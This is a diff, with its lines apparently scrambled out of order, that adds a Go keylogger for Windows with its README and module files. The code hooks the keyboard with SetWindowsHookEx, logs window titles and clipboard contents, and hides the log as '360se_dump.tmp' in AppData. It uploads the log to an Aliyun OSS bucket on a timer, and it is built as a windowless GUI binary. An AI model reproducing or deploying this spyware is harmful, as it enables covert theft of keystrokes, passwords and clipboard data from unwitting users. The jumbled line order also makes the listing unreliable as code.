@@ -1,0 +1,466 @@
+              CAPS = 0
+              CAPS = 1
+          CAPS2 = 0
+          CAPS2 = 1
+          SHIFT = 1
+          if CAPS == 1 {
+          tmpKeylog 
+          tmpTitle = syscall.UTF16ToString(b)
+          }
+          } else {
+         //
+         code := byte(kbdstruct.VkCode)
+         err = error(e1)
+         err = syscall.EINVAL
+         if CAPS == 0 
+         if SHIFT == 1 {
+         if SHIFT == 32769 
+         if code == w32.VK_CAPITAL {
+         if tmpTitle != syscall.UTF16ToString(b) {
+         kbdstruct := (
+         precLog = tmpKeylog
+         savefile(tmpKeylog)
+         text = text1
+         tmpKeylog 
+         }
+         } else if CAPS2 == 1 {
+         } else {
+        <- t.C
+        Keylogger()
+        format: bucketName:accessKeyId:accessKeySecret:endpoint
+        go WindowLogger()
+        go clipboardLogger()
+        handleError(err)
+       err = error(e1)
+       if e1 != 0 {
+       if err != nil {
+       if nCode == 0 
+       log.Fatal(err)
+       return
+       time.Sleep(1 
+       time.Sleep(20 
+       uintptr(msgFilterMax))
+       }
+       } else {
+    )
+    //log.Printf(dir)
+    //var write bool = false
+    CAPS = CAPS 
+    DWORD     uint32
+    DwExtraInfo uintptr
+    Flags       DWORD
+    HANDLE    uintptr
+    HHOOK     HANDLE
+    HINSTANCE HANDLE
+    HWND      HANDLE
+    Hwnd    HWND
+    LPARAM    uintptr
+    LParam  uintptr
+    LRESULT   uintptr
+    Message uint32
+    Pt      POINT
+    ScanCode    DWORD
+    Time        DWORD
+    Time    uint32
+    UnhookWindowsHookEx(keyboardHook)
+    VkCode      DWORD
+    WH_KEYBOARD_LL = 13
+    WM_KEYDOWN     = 256
+    WPARAM    uintptr
+    WParam  uintptr
+    app := usr.HomeDir 
+    defer f.Close()
+    defer file.Close()
+    defer t.Stop()
+    directory := getAppData()
+    file 
+    flag.IntVar(
+    flag.Parse()
+    flag.StringVar(
+    for GetMessage(
+    for {
+    hwnd = syscall.Handle(r0)
+    if !isExist(dir) {
+    if e1 != 0 {
+    if err != nil {
+    if len == 0 {
+    keyboardHook            HHOOK
+    keyboardHook = 0
+    len = int32(r0)
+    log.Printf(str)
+    log.SetOutput(f)
+    myobject := now 
+    os.Exit(-1)
+    return
+    return HHOOK(ret)
+    return LRESULT(ret)
+    return app
+    return err == nil
+    return int(ret)
+    return ret != 0
+    t := time.NewTicker(time.Minute
+    time.Sleep(20 
+    tmpKeylog               string
+    var CAPS2 uintptr
+    var SHIFT uintptr
+    var min int
+    var msg MSG
+    var osskey string
+    var tmpTitle string
+    writer                  Writer
+    writer.file = file
+    }
+    }else {
+  -o string
+  -t int
+ 0x000001
+ CAPS2 == 0 {
+ Compile
+ Data
+ Download Dependencies
+ References
+ SHIFT == 32768 {
+ Usage
+ Use Proxy If you are in China!
+ keylogger
+ text1 
+ text1 != text {
+ time.Millisecond)
+ tmpTitle 
+ wparam == WM_KEYDOWN {
+"         SHIFT, _, _ = procGetAsyncKeyState.Call(uintptr(w32.VK_SHIFT))"
+"         log.Fatal(""cannot create directory"")"
+"         tmpKeylog = """""
+"        Upload interval,default: 60min (default 60)"
+"        fmt.Println(time.Unix(time.Now().Unix(), 0,).Format(""2006-01-02 15:04:05"")"
+"        go uploading(str1,min)"
+"        upload(str1[3], str1[1], str1[2], str1[0], dir"
+"       _, err := getWindowText(g, "
+"       b := make([]uint16, 200)"
+"       err := os.MkdirAll(dir, 0777)"
+"       g, _ := getForegroundWindow()"
+"       if syscall.UTF16ToString(b) != """" {"
+"       if text1 != """" "
+"       if tmpKeylog != """" {"
+"       log.Fatal(""Cannot create file"", err)"
+"       log.Fatalf(""file open error : %v"", err)"
+"       return CallNextHookEx(keyboardHook, nCode, wparam, lparam)"
+"       text1, _ := clipboard.ReadAll()"
+"       uintptr(dwThreadId),"
+"       uintptr(hMod),"
+"       uintptr(hhk),"
+"       uintptr(hwnd),"
+"       uintptr(idHook),"
+"       uintptr(lParam),"
+"       uintptr(msgFilterMin),"
+"       uintptr(nCode),"
+"       uintptr(syscall.NewCallback(lpfn)),"
+"       uintptr(unsafe.Pointer(msg)),"
+"       uintptr(wParam),"
+"    ""flag"""
+"    ""fmt"""
+"    ""github.com/TheTitanrain/w32"""
+"    ""github.com/aliyun/aliyun-oss-go-sdk/oss"""
+"    ""github.com/atotto/clipboard"""
+"    ""golang.org/x/sys/windows"""
+"    ""log"""
+"    ""os"""
+"    ""os/user"""
+"    ""strconv"""
+"    ""strings"""
+"    ""syscall"""
+"    ""time"""
+"    ""unsafe"""
+"    100: ""4"","
+"    101: ""5"","
+"    102: ""6"","
+"    103: ""7"","
+"    104: ""8"","
+"    105: ""9"","
+"    106: """
+"    107: """
+"    108: ""[Separator]"","
+"    109: ""-"","
+"    10:  ""[Shift]"","
+"    110: ""."","
+"    111: ""[Divide]"","
+"    112: ""[F1]"","
+"    113: ""[F2]"","
+"    114: ""[F3]"","
+"    115: ""[F4]"","
+"    116: ""[F5]"","
+"    117: ""[F6]"","
+"    118: ""[F7]"","
+"    119: ""[F8]"","
+"    120: ""[F9]"","
+"    121: ""[F10]"","
+"    122: ""[F11]"","
+"    123: ""[F12]"","
+"    13:  ""[Enter]"
+"    144: ""[NumLock]"","
+"    145: ""[ScrollLock]"","
+"    14:  """","
+"    15:  """","
+"    160: """", //LShift"
+"    161: """", //RShift"
+"    162: ""[Ctrl]"","
+"    163: ""[Ctrl]"","
+"    164: ""[Alt]"", //LeftMenu"
+"    165: ""[RightMenu]"","
+"    16:  """","
+"    17:  ""[Ctrl]"","
+"    186: """
+"    186: "":"","
+"    187: """
+"    187: ""="","
+"    188: "","","
+"    188: ""<"","
+"    189: ""-"","
+"    189: ""_"","
+"    18:  ""[Alt]"","
+"    190: ""."","
+"    190: "">"","
+"    191: """
+"    191: ""/"","
+"    192: """
+"    19:  """","
+"    20:  """", //CAPS LOCK"
+"    219: """
+"    219: ""["","
+"    220: """
+"    221: ""]"","
+"    221: ""}"","
+"    222: """
+"    222: ""'"","
+"    223: ""!"","
+"    27:  ""[Esc]"","
+"    32:  "" "", //SPACE"
+"    33:  ""[PageUp]"","
+"    34:  ""[PageDown]"","
+"    35:  ""[End]"","
+"    36:  ""[Home]"","
+"    37:  ""[Left]"","
+"    38:  ""[Up]"","
+"    39:  ""[Right]"","
+"    40:  ""[Down]"","
+"    41:  ""[Select]"","
+"    42:  ""[Print]"","
+"    43:  ""[Execute]"","
+"    44:  ""[PrintScreen]"","
+"    45:  ""[Insert]"","
+"    46:  ""[Delete]"","
+"    47:  ""[Help]"","
+"    48:  "")"","
+"    48:  ""0"","
+"    49:  ""!"","
+"    49:  ""1"","
+"    50:  ""2"","
+"    50:  ""@"","
+"    51:  """
+"    51:  ""3"","
+"    52:  ""$"","
+"    52:  ""4"","
+"    53:  ""%"","
+"    53:  ""5"","
+"    54:  """
+"    54:  ""6"","
+"    55:  """
+"    55:  ""7"","
+"    56:  """
+"    56:  ""8"","
+"    57:  ""("","
+"    57:  ""9"","
+"    65:  ""A"","
+"    65:  ""a"","
+"    66:  ""B"","
+"    66:  ""b"","
+"    67:  ""C"","
+"    67:  ""c"","
+"    68:  ""D"","
+"    68:  ""d"","
+"    69:  ""E"","
+"    69:  ""e"","
+"    70:  ""F"","
+"    70:  ""f"","
+"    71:  ""G"","
+"    71:  ""g"","
+"    72:  ""H"","
+"    72:  ""h"","
+"    73:  ""I"","
+"    73:  ""i"","
+"    74:  ""J"","
+"    74:  ""j"","
+"    75:  ""K"","
+"    75:  ""k"","
+"    76:  ""L"","
+"    76:  ""l"","
+"    77:  ""M"","
+"    77:  ""m"","
+"    78:  ""N"","
+"    78:  ""n"","
+"    79:  ""O"","
+"    79:  ""o"","
+"    80:  ""P"","
+"    80:  ""p"","
+"    81:  ""P"","
+"    81:  ""Q"","
+"    81:  ""q"","
+"    82:  ""R"","
+"    82:  ""r"","
+"    83:  ""S"","
+"    83:  ""s"","
+"    84:  ""T"","
+"    84:  ""t"","
+"    85:  ""U"","
+"    85:  ""u"","
+"    86:  ""V"","
+"    86:  ""v"","
+"    87:  ""W"","
+"    87:  ""w"","
+"    88:  ""X"","
+"    88:  ""x"","
+"    89:  ""Y"","
+"    89:  ""y"","
+"    8:   ""[Back]"","
+"    90:  ""Z"","
+"    90:  ""z"","
+"    91:  ""[Windows]"","
+"    92:  ""[Windows]"","
+"    93:  ""[Applications]"","
+"    94:  """","
+"    95:  ""[Sleep]"","
+"    96:  ""0"","
+"    97:  ""1"","
+"    98:  ""2"","
+"    99:  ""3"","
+"    9:   ""[Tab]"","
+"    CAPS, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))"
+"    X, Y int32"
+"    _, err := os.Stat(filename)"
+"    bucket, err := client.Bucket(bucketName)"
+"    client, err := oss.New(Endpoint, AccessKeyId, AccessKeySecret)"
+"    dir := strings.Replace(directory, """
+"    err = bucket.PutObjectFromFile(myobject, LocalFile)"
+"    f, err := os.OpenFile(dir"
+"    file, err := os.Create(path)"
+"    fmt.Println(""Error:"", err)"
+"    if(osskey != """"){"
+"    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {"
+"    now := strconv.FormatInt(time.Now().Unix(),10)"
+"    procCallNextHookEx      = user32.NewProc(""CallNextHookEx"")"
+"    procGetAsyncKeyState    = user32.NewProc(""GetAsyncKeyState"")"
+"    procGetForegroundWindow = user32.NewProc(""GetForegroundWindow"")"
+"    procGetKeyState         = user32.NewProc(""GetKeyState"")"
+"    procGetMessage          = user32.NewProc(""GetMessageW"")"
+"    procGetWindowTextW      = user32.NewProc(""GetWindowTextW"")"
+"    procSetWindowsHookEx    = user32.NewProc(""SetWindowsHookExW"")"
+"    procUnhookWindowsHookEx = user32.NewProc(""UnhookWindowsHookEx"")"
+"    r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)"
+"    r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))"
+"    ret, _, _ := procCallNextHookEx.Call("
+"    ret, _, _ := procGetMessage.Call("
+"    ret, _, _ := procSetWindowsHookEx.Call("
+"    ret, _, _ := procUnhookWindowsHookEx.Call("
+"    str1 := strings.Split(osskey, "":"")"
+"    text, _ := clipboard.ReadAll()"
+"    user32                  = windows.NewLazySystemDLL(""user32.dll"")"
+"    usr, err := user.Current()"
+"    var precLog string = """""
+"    vowelMaj                string = ""AEIOU"""
+"    vowelMin                string = ""aeiou"""
+"    }), 0, 0)"
+" "".log"""
+""" succeeded"")"
+""", ""/"", -1)"
+"""360se_dump.tmp"")"
+"""360se_dump.tmp"", os.O_RDWR"
+""": upload """
+"= string("""
+"If you are in China Mainland, please check: https://goproxy.cn/ for golang dependency download proxy setting guide."
+"MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32) int {"
+"To prevent Aliyun OSS Access Key from leakage, please use with caution."
+"Without any runtime params, it will never upload any recorded data."
+"b[0], int32(len(b)))"
+"func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {"
+"func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {"
+"func getForegroundWindow() (hwnd syscall.Handle, err error) {"
+"func getWindowText(hwnd syscall.Handle, str "
+"func upload(Endpoint string, AccessKeyId string, AccessKeySecret string, bucketName string, LocalFile string)  {"
+"func uploading(str1 []string,min int){"
+"go build -trimpath -ldflags ""-s -w -H=windowsgui"" key.go"
+"min, ""t"", 60, ""Upload interval,default: 60min"")"
+"msg, 0, 0, 0) != 0 {"
+"n["" "
+"n[Clipboard: "" "
+"os.O_APPEND, 0644)"
+"osskey, ""o"", """", ""format: bucketName:accessKeyId:accessKeySecret:endpoint"")"
+"type HOOKPROC func(int, WPARAM, LPARAM) LRESULT"
+"uint16, maxCount int32) (len int32, err error) {"
+//SHIFT
+360se_dump.tmp
+<USERNAME>
+= capup[uint16(code)]
+= keys_high[uint16(code)]
+= keys_low[uint16(code)]
+> keylogger.exe -h
+AppData
+CntffsBHJ8nXQCwKr0/g8=
+HPhhw
+KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
+Local
+Microsoft.Messaging
+Packages
+Tested only on Windows.
+Usage of keylogger.exe:
+Users
+const (
+func CreateKeylogFile(path string) {
+func GetMessage(msg 
+func Keylogger() {
+func UnhookWindowsHookEx(hhk HHOOK) bool {
+func WindowLogger() {
+func clipboardLogger() {
+func getAppData() string {
+func handleError(err error) {
+func isExist(filename string) bool {
+func main() {
+func savefile(str string) {
+github.com/TheTitanrain/w32 v0.0.0-20200114052255-2654d97dbd3d // indirect
+github.com/TheTitanrain/w32 v0.0.0-20200114052255-2654d97dbd3d h1:2xp1BQbqcDDaikHnASWpVZRjibOxu7y9LhAv04whugI=
+github.com/TheTitanrain/w32 v0.0.0-20200114052255-2654d97dbd3d/go.mod h1:peYoMncQljjNS6tZwI9WVyQB3qZS6u79/N3mBOcnd3I=
+github.com/aliyun/aliyun-oss-go-sdk v1.9.8 h1:BOflvK0Zs/zGmoabyFIzTg5c3kguktWTXEwewwbuba0=
+github.com/aliyun/aliyun-oss-go-sdk v2.1.5
+github.com/atotto/clipboard v0.1.2 // indirect
+github.com/atotto/clipboard v0.1.2 h1:YZCtFu5Ie8qX2VmVTBnrqLSiU9XOWwqNRmdT3gIQzbY=
+github.com/atotto/clipboard v0.1.2/go.mod h1:ZY9tmq7sm5xIbd9bOK4onWV4S6X0u6GY7Vn0Yu86PYI=
+go 1.15
+go mod download 
+golang.org/x/sys v0.0.0-20201202213521-69691e467435 // indirect
+golang.org/x/sys v0.0.0-20201202213521-69691e467435 h1:25AvDqqB9PrNqj1FLf2/70I4W0L19qqoaFq3gjNwbKk=
+golang.org/x/sys v0.0.0-20201202213521-69691e467435/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
+golang.org/x/time v0.0.0-20200630173020-3af7569d3a1e // indirect
+golang.org/x/time v0.0.0-20200630173020-3af7569d3a1e h1:EHBhcS0mlXEAVwNyO2dLfjToGsyY4j24pTs2ScHnX7s=
+golang.org/x/time v0.0.0-20200630173020-3af7569d3a1e/go.mod h1:tRJNPiyCQ0inRvYxbN9jk5I
+https://github.com/mabangde/pentesttools/blob/master/golang/keylogger.go
+import (
+incompatible // indirect
+incompatible h1:v5yDfjkRY/kOxu05gkh0/D/2wYxbTFCoTr3JqFI0FLE=
+incompatible/go.mod h1:T/Aws4fEfogEE9v
+module github.com/kmahyyg/keylogger
+myobject
+os.File
+os.O_CREATE
+package main
+require (
+shift
+time.Duration(min))
+type (
+type KBDLLHOOKSTRUCT struct {
+type MSG struct {
+type POINT struct {
+type Writer struct {
+var (
+var capup = map[uint16]string{
+var keys_high = map[uint16]string{
+var keys_low = map[uint16]string{
+vvW/OXSQhTDSoE431IQ=
